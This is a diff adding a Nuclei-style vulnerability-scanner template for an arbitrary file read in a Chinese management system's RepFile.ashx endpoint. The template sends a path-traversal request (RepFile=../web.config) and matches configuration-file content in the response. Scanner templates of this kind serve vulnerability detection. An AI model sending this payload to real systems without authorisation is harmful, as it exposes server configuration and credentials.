@@ -1,0 +1,22 @@
+id: youjiasoft-repfile-ashx-anyfile-read
+info:
+  name: 友加畅捷管理系统 RepFile.ashx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReportDesign/RepFile.ashx?Type=ReadReportCpfFile&RepFile=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</system.web>"
+          - "<configuration>"
+          - "<webServices>"
+          - "youjiasoft"
+        part: body
